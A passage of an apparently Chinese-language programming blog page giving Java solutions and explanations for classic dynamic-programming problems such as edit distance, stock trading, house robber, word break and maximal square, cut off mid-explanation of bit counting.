i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">        dp[<span class="number">0</span>][j] = j;</span><br><span class="line">    <span class="comment">// 自底向上求解</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            <span class="keyword">if</span> (s1.charAt(i-<span class="number">1</span>) == s2.charAt(j-<span class="number">1</span>))&#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j] = Math.min(</span><br><span class="line">                    Math.min(dp[i - <span class="number">1</span>][j] + <span class="number">1</span>,dp[i][j - <span class="number">1</span>] + <span class="number">1</span>),</span><br><span class="line">                    dp[i-<span class="number">1</span>][j-<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">                );</span><br><span class="line">            &#125;               </span><br><span class="line">                </span><br><span class="line">    <span class="comment">// 储存着整个 s1 和 s2 的最小编辑距离</span></span><br><span class="line">    <span class="keyword">return</span> dp[m][n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-8-最大子序和"><a href="#6-8-最大子序和" class="headerlink" title="6.8 最大子序和"></a>6.8 最大子序和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">int</span> dp_0 = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> dp_1 = <span class="number">0</span>, res = dp_0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="comment">// dp[i] = max(nums[i], nums[i] + dp[i-1])</span></span><br><span class="line">        dp_1 = Math.max(nums[i], nums[i] + dp_0);</span><br><span class="line">        dp_0 = dp_1;</span><br><span class="line">        <span class="comment">// 顺便计算最大的结果</span></span><br><span class="line">        res = Math.max(res, dp_1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-9-最长递增子序列"><a href="#6-9-最长递增子序列" class="headerlink" title="6.9 最长递增子序列"></a>6.9 最长递增子序列</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> dp[] = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; nums[j])&#123;</span><br><span class="line">                dp[i] = Math.max(dp[i],dp[j] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dp.length; i++)&#123;</span><br><span class="line">        res = Math.max(res,dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-10-买卖股票的最佳时机"><a href="#6-10-买卖股票的最佳时机" class="headerlink" title="6.10 买卖股票的最佳时机"></a>6.10 买卖股票的最佳时机</h2><p>动态规划</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = prices.length;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//状态转移</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i - <span class="number">1</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 解释：</span></span><br><span class="line">            <span class="comment">//   dp[i][0] </span></span><br><span class="line">            <span class="comment">// = max(dp[-1][0], dp[-1][1] + prices[i])</span></span><br><span class="line">            <span class="comment">// = max(0, -infinity + prices[i]) = 0</span></span><br><span class="line">            dp[i][<span class="number">1</span>] = -prices[i];</span><br><span class="line">            <span class="comment">//解释：</span></span><br><span class="line">            <span class="comment">//   dp[i][1] </span></span><br><span class="line">            <span class="comment">// = max(dp[-1][1], dp[-1][0] - prices[i])</span></span><br><span class="line">            <span class="comment">// = max(-infinity, 0 - prices[i]) </span></span><br><span class="line">            <span class="comment">// = -prices[i]</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">     &#125;</span><br><span class="line">         dp[i][<span class="number">0</span>] = Math.max(dp[i - <span class="number">1</span>][<span class="number">0</span>],dp[i - <span class="number">1</span>][<span class="number">1</span>] + prices[i]);</span><br><span class="line">         dp[i][<span class="number">1</span>] = Math.max(dp[i - <span class="number">1</span>][<span class="number">1</span>],-prices[i]);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="keyword">return</span> dp[n - <span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优化空间：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// k == 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit_k_1</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = prices.length;</span><br><span class="line">    <span class="comment">// base case: dp[-1][0] = 0, dp[-1][1] = -infinity</span></span><br><span class="line">    <span class="keyword">int</span> dp_i_0 = <span class="number">0</span>, dp_i_1 = Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="comment">// dp[i][0] = max(dp[i-1][0], dp[i-1][1] + prices[i])</span></span><br><span class="line">        dp_i_0 = Math.max(dp_i_0, dp_i_1 + prices[i]);</span><br><span class="line">        <span class="comment">// dp[i][1] = max(dp[i-1][1], -prices[i])</span></span><br><span class="line">        dp_i_1 = Math.max(dp_i_1, -prices[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp_i_0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一次遍历的方法，依次遍历，假定每天尝试卖出，搜索当前天之前的历史最低价格</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> prices[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minprice = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (prices[i] &lt; minprice) &#123;</span><br><span class="line">    minprice = prices[i];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prices[i] - minprice &gt; maxprofit) &#123;</span><br><span class="line">    maxprofit = prices[i] - minprice;</span><br><span class="line">   &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> maxprofit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-11-打家劫舍"><a href="#6-11-打家劫舍" class="headerlink" title="6.11 打家劫舍"></a>6.11 打家劫舍</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] memo;</span><br><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化备忘录</span></span><br><span class="line">    memo = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    Arrays.fill(memo, -<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 强盗从第 0 间房子开始抢劫</span></span><br><span class="line">    <span class="keyword">return</span> dp(nums, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回 dp[start..] 能抢到的最大值</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">dp</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (start &gt;= nums.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 避免重复计算</span></span><br><span class="line">    <span class="keyword">if</span> (memo[start] != -<span class="number">1</span>) <span class="keyword">return</span> memo[start];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = Math.max(dp(nums, start + <span class="number">1</span>), </span><br><span class="line">                    nums[start] + dp(nums, start + <span class="number">2</span>));</span><br><span class="line">    <span class="comment">// 记入备忘录</span></span><br><span class="line">    memo[start] = res;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-12-爬楼梯"><a href="#6-12-爬楼梯" class="headerlink" title="6.12 爬楼梯"></a>6.12 爬楼梯</h2><p>自顶向下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> memo[];</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    memo = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> dp(memo,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dp</span><span class="params">(<span class="keyword">int</span>[] memo,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span> || n == <span class="number">1</span>)&#123;</span><br><span class="line">        memo[n] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> memo[n];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(memo[n] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> memo[n];</span><br><span class="line">    &#125;</span><br><span class="line">    memo[n] = dp(memo,n - <span class="number">1</span>) + dp(memo,n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自底向上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//base case</span></span><br><span class="line">    <span class="keyword">int</span> dp0 = <span class="number">1</span>,dp1 = <span class="number">1</span>,dp2 = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//状态转移</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++)&#123;</span><br><span class="line">        dp2 = dp0 + dp1;</span><br><span class="line">        dp0 = dp1;</span><br><span class="line">        dp1 = dp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-13-最小路径和"><a href="#6-13-最小路径和" class="headerlink" title="6.13 最小路径和"></a>6.13 最小路径和</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> m = grid.length,n = grid[<span class="number">0</span>].length;</span><br><span class="line">       <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[m][n];</span><br><span class="line"></span><br><span class="line">       <span class="comment">//base case</span></span><br><span class="line">       dp[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">           dp[i][<span class="number">0</span>] = grid[i][<span class="number">0</span>] + dp[i - <span class="number">1</span>][<span class="number">0</span>]; </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">           dp[<span class="number">0</span>][j] = grid[<span class="number">0</span>][j] + dp[<span class="number">0</span>][j - <span class="number">1</span>]; </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//状态转移</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">               dp[i][j] = Math.min(dp[i - <span class="number">1</span>][j],dp[i][j - <span class="number">1</span>]) + grid[i][j]; </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="6-14-单词拆分"><a href="#6-14-单词拆分" class="headerlink" title="6.14 单词拆分"></a>6.14 单词拆分</h2><p>完全背包问题</p><p>wordDict是物品列表，且可以无限使用，非空字符串s是背包。</p><p>$dp[i]$为true代表以i结尾的s子串可以拆分为一个或多个在字典中出现的单词。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">    Set&lt;String&gt; wordDictSet = <span class="keyword">new</span> HashSet(wordDict);</span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    <span class="keyword">boolean</span> dp[] = <span class="keyword">new</span> <span class="keyword">boolean</span>[n + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//base case</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">//状态转移</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[j] &amp;&amp; wordDictSet.contains(s.substring(j,i)))&#123;</span><br><span class="line">                dp[i] = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-15-乘积最大子数组"><a href="#6-15-乘积最大子数组" class="headerlink" title="6.15 乘积最大子数组"></a>6.15 乘积最大子数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> n = nums.length;</span><br><span class="line">     <span class="keyword">int</span> res = Integer.MIN_VALUE;</span><br><span class="line">     <span class="keyword">int</span> dpMax = <span class="number">1</span>,dpMin = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">         <span class="keyword">if</span>(nums[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">             <span class="keyword">int</span> temp = dpMax;</span><br><span class="line">             dpMax = dpMin;</span><br><span class="line">             dpMin = temp;</span><br><span class="line">         &#125;</span><br><span class="line">         dpMax = Math.max(dpMax * nums[i],nums[i]);</span><br><span class="line">         dpMin = Math.min(dpMin * nums[i],nums[i]);</span><br><span class="line">     </span><br><span class="line">         res = Math.max(dpMax,res);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="6-16-最大正方形"><a href="#6-16-最大正方形" class="headerlink" title="6.16 最大正方形"></a>6.16 最大正方形</h2><p>可以使用动态规划降低时间复杂度。我们用$ \textit{dp}(i, j)$ 表示以 $(i, j)$ 为右下角，且只包含 1 的正方形的边长最大值。如果我们能计算出所有 $\textit{dp}(i, j)$ 的值，那么其中的最大值即为矩阵中只包含 1 的正方形的边长最大值，其平方即为最大正方形的面积。</p><p>那么如何计算 $\textit{dp}$ 中的每个元素值呢？对于每个位置 $(i, j)$，检查在矩阵中该位置的值：</p><p>如果该位置的值是 0，则 $\textit{dp}(i, j) = 0$，因为当前位置不可能在由 1 组成的正方形中；</p><p>如果该位置的值是 1，则 $\textit{dp}(i, j)$的值由其上方、左方和左上方的三个相邻位置的$ \textit{dp}$ 值决定。具体而言，当前位置的元素值等于三个相邻位置的元素中的最小值加 1，状态转移方程如下：</p><script type="math/tex; mode=display">dp(i,j)=min(dp(i−1,j),dp(i−1,j−1),dp(i,j−1))+1</script><p>先来阐述简单共识</p><p>若形成正方形（非单 1），以当前为右下角的视角看，则需要：当前格、上、左、左上都是 1<br>可以换个角度：当前格、上、左、左上都不能受 0 的限制，才能成为正方形</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/最大正方形状态转移.png" style="zoom:67%;" /></p><p>上面详解了 三者取最小 的含义：</p><p>图 1：受限于左上的 0<br>图 2：受限于上边的 0<br>图 3：受限于左边的 0<br>数字表示：以此为正方形右下角的最大边长<br>黄色表示：格子 ? 作为右下角的正方形区域<br>就像 木桶的短板理论 那样——附近的最小边长，才与 ? 的最长边长有关。</p><ul><li>从上述图解中，我们似乎得到的只是「动态规划 推进 的过程」，即「如何从前面的 dp 推出后面的 dp」，甚至还只是感性理解</li><li>距离代码我们还缺：dp 具体定义如何，数组多大，初值如何，如何与题目要求的面积相关</li><li>dp 具体定义：$dp[i + 1][j + 1]$ 表示 「以第 i 行、第 j 列为右下角的正方形的最大边长」<ul><li>为何不是 $dp[i][j]$</li><li>回到图解中，任何一个正方形，我们都「依赖」当前格 左、上、左上三个方格的情况</li><li>但第一行的上层已经没有格子，第一列左边已经没有格子，需要做特殊 if 判断来处理</li><li>为了代码简洁，我们 假设补充 了多一行全 ‘0’、多一列全 ‘0’</li></ul></li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/035ec1919a802f81078ce40bde8c33d6c0990b486ce3aebd846d1fdf79241221-image.png" alt=""></p><ul><li>此时 dp 数组的大小也明确为$ new dp[height + 1][width + 1]$</li><li>初始值就是将第一列 $dp[row][0] $、第一行$ dp[0][col] $都赋为 0，相当于已经计算了所有的第一行、第一列的 dp 值</li><li>题目要求面积。根据 「面积 = 边长 x 边长」可知，我们只需求出 最大边长 即可<ul><li>定义 maxSide 表示最长边长，每次得出一个 dp，就 maxSide = max(maxSide, dp);</li><li>最终返回 return maxSide * maxSide;</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(<span class="keyword">char</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// base condition</span></span><br><span class="line">    <span class="keyword">if</span> (matrix == <span class="keyword">null</span> || matrix.length &lt; <span class="number">1</span> || matrix[<span class="number">0</span>].length &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> height = matrix.length;</span><br><span class="line">    <span class="keyword">int</span> width = matrix[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span> maxSide = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 相当于已经预处理新增第一行、第一列均为0</span></span><br><span class="line">    <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[height + <span class="number">1</span>][width + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> row = <span class="number">0</span>; row &lt; height; row++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> col = <span class="number">0</span>; col &lt; width; col++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[row][col] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                dp[row + <span class="number">1</span>][col + <span class="number">1</span>] = Math.min(Math.min(dp[row + <span class="number">1</span>][col], dp[row][col + <span class="number">1</span>]), dp[row][col]) + <span class="number">1</span>;</span><br><span class="line">                maxSide = Math.max(maxSide, dp[row + <span class="number">1</span>][col + <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSide * maxSide;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-17-完全平方数"><a href="#6-17-完全平方数" class="headerlink" title="6.17 完全平方数"></a>6.17 完全平方数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        dp[i] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;i - j*j &gt;=<span class="number">0</span>; j++)&#123;</span><br><span class="line">            dp[i] = Math.min(dp[i - j * j] + <span class="number">1</span>,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-18-比特位计数"><a href="#6-18-比特位计数" class="headerlink" title="6.18 比特位计数"></a>6.18 比特位计数</h2><p>对于所有的数字，只有两类：</p><p>奇数：二进制表示中，奇数一定比前面那个偶数多一个 1，因为多的就是最低位的 1。<br>          举例：<br>         0 = 0       1 = 1<br>         2 = 10      3 = 11<br>偶数：二进制表示中，偶数中 1 的个数一定和除以 2 之后的那个数一样多。因为最低位是 0，除以 2 就是右移一位，也就是把那个 0 抹掉而已，所以 1 的个数是不变的。<br>           举例：<br>          2 = 10       4 